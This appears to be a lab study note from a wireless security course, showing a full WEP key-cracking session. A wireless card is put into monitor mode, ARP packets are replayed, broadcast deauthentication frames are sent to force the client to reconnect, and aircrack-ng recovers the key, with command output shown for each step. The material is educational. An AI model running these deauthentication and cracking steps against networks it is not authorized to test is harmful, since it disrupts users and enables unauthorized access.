#### Part	15: WEP Cracking

Before connecting the Alfa card

```sh
root@kali:~# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.0.101  netmask 255.255.255.0  broadcast 192.168.0.255
        inet6 fe80::a00:27ff:feec:26e5  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:ec:26:e5  txqueuelen 1000  (Ethernet)
        RX packets 51830  bytes 3435415 (3.2 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 47066  bytes 33321752 (31.7 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1  (Local Loopback)
        RX packets 248  bytes 12512 (12.2 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 248  bytes 12512 (12.2 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

root@kali:~#
```	
	
Connect the Alfa card

```sh
root@kali:~# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.0.101  netmask 255.255.255.0  broadcast 192.168.0.255
        inet6 fe80::a00:27ff:feec:26e5  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:ec:26:e5  txqueuelen 1000  (Ethernet)
        RX packets 113  bytes 13062 (12.7 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 116  bytes 19058 (18.6 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1  (Local Loopback)
        RX packets 20  bytes 1116 (1.0 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 20  bytes 1116 (1.0 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

root@kali:~# ifconfig -a
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.0.101  netmask 255.255.255.0  broadcast 192.168.0.255
        inet6 fe80::a00:27ff:feec:26e5  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:ec:26:e5  txqueuelen 1000  (Ethernet)
        RX packets 124  bytes 13940 (13.6 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 123  bytes 20732 (20.2 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1  (Local Loopback)
        RX packets 20  bytes 1116 (1.0 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 20  bytes 1116 (1.0 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan0: flags=4098<BROADCAST,MULTICAST>  mtu 1500
        ether 00:c0:ca:92:3c:89  txqueuelen 1000  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

root@kali:~# ifconfig wlan0 up
root@kali:~# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.0.101  netmask 255.255.255.0  broadcast 192.168.0.255
        inet6 fe80::a00:27ff:feec:26e5  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:ec:26:e5  txqueuelen 1000  (Ethernet)
        RX packets 377  bytes 30254 (29.5 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 169  bytes 26425 (25.8 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1  (Local Loopback)
        RX packets 20  bytes 1116 (1.0 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 20  bytes 1116 (1.0 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        ether ae:ac:75:a7:71:b2  txqueuelen 1000  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

root@kali:~#
```

Put the card in monitor mode

```sh
root@kali:~# airmon-ng

PHY	Interface	Driver		Chipset

phy1	wlan0		rtl8187		Realtek Semiconductor Corp. RTL8187

root@kali:~# airmon-ng start wlan0

Found 3 processes that could cause trouble.
If airodump-ng, aireplay-ng or airtun-ng stops working after
a short period of time, you may want to run 'airmon-ng check kill'

  PID Name
  400 NetworkManager
  569 dhclient
  804 wpa_supplicant

PHY	Interface	Driver		Chipset

phy1	wlan0		rtl8187		Realtek Semiconductor Corp. RTL8187

		(mac80211 monitor mode vif enabled for [phy1]wlan0 on [phy1]wlan0mon)
		(mac80211 station mode vif disabled for [phy1]wlan0)

root@kali:~# airmon-ng

PHY	Interface	Driver		Chipset

phy1	wlan0mon	rtl8187		Realtek Semiconductor Corp. RTL8187

root@kali:~#
```

Check for the monitor mode interface

```sh
root@kali:~# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.0.101  netmask 255.255.255.0  broadcast 192.168.0.255
        inet6 fe80::a00:27ff:feec:26e5  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:ec:26:e5  txqueuelen 1000  (Ethernet)
        RX packets 518  bytes 40324 (39.3 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 236  bytes 35799 (34.9 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1  (Local Loopback)
        RX packets 20  bytes 1116 (1.0 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 20  bytes 1116 (1.0 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan0mon: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        unspec 00-C0-CA-92-3C-89-30-30-00-00-00-00-00-00-00-00  txqueuelen 1000  (UNSPEC)
        RX packets 858  bytes 151521 (147.9 KiB)
        RX errors 0  dropped 858  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

root@kali:~# iwconfig
lo        no wireless extensions.

eth0      no wireless extensions.

wlan0mon  IEEE 802.11  Mode:Monitor  Frequency:2.457 GHz  Tx-Power=20 dBm
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:on

root@kali:~#
```

Start ```airodump-ng```

Make sure at least one client is connected

```sh
root@kali:~# airodump-ng wlan0mon --channel 4 --bssid 84:C9:B2:6D:0C:85 --write OnlineCracking

 CH  4 ][ Elapsed: 2 mins ][ 2017-06-06 19:00 ][ disabled selection

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID

 84:C9:B2:6D:0C:85   -3  48     1051    14597   33   4  11e. WEP  WEP    SKA  dlink

 BSSID              STATION            PWR   Rate    Lost    Frames  Probe

 84:C9:B2:6D:0C:85  BC:9F:EF:69:35:19    0   11e- 1   244546    52905

root@kali:~#
```

Detect and replay ```ARP``` packets

Use the ```MAC``` address of the associated client to prevent ```deauth/disassoc``` issue

```sh
root@kali:~# aireplay-ng --arpreplay -e dlink -h BC:9F:EF:69:35:19 wlan0mon
The interface MAC (00:C0:CA:92:3C:89) doesn't match the specified MAC (-h).
	ifconfig wlan0mon hw ether BC:9F:EF:69:35:19
18:58:46  Waiting for beacon frame (ESSID: dlink) on channel 4
Found BSSID "84:C9:B2:6D:0C:85" to given ESSID "dlink".
Saving ARP requests in replay_arp-0606-185846.cap
You should also start airodump-ng to capture replies.
^Cad 74081 packets (got 39003 ARP requests and 25781 ACKs), sent 28687 packets...(499 pps)
```

We need to increase the number of ```Data``` packets so we deauth the client so that he again goes ahead and makes a connection to the AP ```dlink```

```sh
root@kali:~# aireplay-ng --deauth 0 -e dlink wlan0mon
18:58:49  Waiting for beacon frame (ESSID: dlink) on channel 4
Found BSSID "84:C9:B2:6D:0C:85" to given ESSID "dlink".
NB: this attack is more effective when targeting
a connected wireless client (-c <client's mac>).
18:58:49  Sending DeAuth to broadcast -- BSSID: [84:C9:B2:6D:0C:85]
18:58:49  Sending DeAuth to broadcast -- BSSID: [84:C9:B2:6D:0C:85]
18:58:50  Sending DeAuth to broadcast -- BSSID: [84:C9:B2:6D:0C:85]
18:58:50  Sending DeAuth to broadcast -- BSSID: [84:C9:B2:6D:0C:85]
^C
root@kali:~#
```

Start ```aircrack-ng``` ones the ```Data``` packets reach ```10000```

```sh
root@kali:~# aircrack-ng OnlineCracking-01.cap
Opening OnlineCracking-01.cap
Read 78264 packets.

   #  BSSID              ESSID                     Encryption

   1  84:C9:B2:6D:0C:85  dlink                     WEP (11905 IVs)

Choosing first network as target.

Opening OnlineCracking-01.cap
Attack will be restarted every 5000 captured ivs.
Starting PTW attack with 11932 ivs.

                                          Aircrack-ng 1.2 rc4


                          [00:00:01] Tested 136119 keys (got 11632 IVs)

   KB    depth   byte(vote)
    0    0/ 54   AA(17152) 9D(16640) 0A(15872) C9(15872) E7(15616) F8(15616) A2(15360)
    1   16/ 21   CB(14336) 21(14080) 36(14080) 4F(14080) 65(14080) 91(14080) AB(14080)
    2    2/  7   CC(16896) 9B(16896) FF(16640) 07(15872) F9(15616) 03(15104) 3A(15104)
    3    0/  1   DD(21248) 80(16896) A1(16128) 00(15872) C3(15872) 75(15616) EE(15616)
    4    1/ 18   EE(16896) 4E(16640) 73(15616) 7F(15616) 47(15360) 6C(15360) F7(15104)

                         KEY FOUND! [ AA:BB:CC:DD:EE ]
	Decrypted correctly: 100%


root@kali:~#
```

![Image of Demo](https://github.com/Kan1shka9/Wireless-LAN-Security-Megaprimer-Notes/blob/master/images/part_15.jpeg)
